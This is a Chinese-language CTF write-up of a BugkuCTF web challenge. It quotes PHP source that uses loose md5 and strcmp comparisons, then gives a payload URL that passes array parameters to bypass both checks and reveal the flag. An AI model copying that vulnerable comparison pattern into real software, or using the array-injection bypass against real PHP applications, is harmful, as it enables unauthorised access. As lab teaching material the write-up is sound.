---
title: BugkuCTF-web-前女友 writeup
date: 2019-07-13 13:38:14
tags: CTF WEB
categories: CTF做题记录
---

# 题目描述
题目传送门：http://123.206.31.85:49162/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190713131216207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
<!--more-->
# 解题思路
打开链接一大段文字，，，没什么有用的，，嗯，PHP是世界上最好的语言
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071313165768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
老套路，先看看源码再说
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190713131357770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
不看源码还真是看不出来这有个链接，打开这个隐蔽链接后得到：
```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){//v1与v2的值要不一样，但是他们经过md5加密后又一样
        if(!strcmp($v3, $flag)){//strcmp() 函数比较两个字符串（区分大小写），相同则返回0
            echo $flag;
        }
    }
}
?>
```
- 因为md5不能处理数组，如果md5处理数组则为NULL，那么我们可以将v1,v2写成数组传入即可
- strcmp()函数,要想v3和flag相同，我们也可以将v3写成数组绕过
# 得到FLAG
综上，构造pyload
`http://123.206.31.85:49162/index.php?v1[]=1&v2[]=2&v3[]=3`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190713133447909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)

---
# END
